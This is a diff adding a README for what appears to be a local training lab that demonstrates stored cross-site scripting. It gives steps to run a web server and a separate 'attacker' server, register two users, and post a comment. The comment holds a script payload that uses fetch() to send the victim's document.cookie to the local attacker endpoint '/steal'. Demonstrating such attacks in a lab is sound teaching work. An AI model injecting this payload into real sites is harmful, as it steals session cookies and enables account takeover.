@@ -1,0 +1,19 @@
+# Stored-XSS Server
+1) To run server:
+```cmd
+.venv\Scripts\activate
+pip install -r requirements.txt
+python server.py
+python attacker_server.py
+```
+2) Open http://127.0.0.1 or http://localhost
+3) Register 2 new users (e.g. Alice and Bob)
+4) Login as Alice, leave a comment (script below):
+```html
+<script>
+	alert("your cookies has been stolen");
+	fetch("http://127.0.0.1:9000/steal?cookie=" + document.cookie);
+</script>
+```
+5) Logout form Alice and login as Bob.
+6) See the result in Terminal.
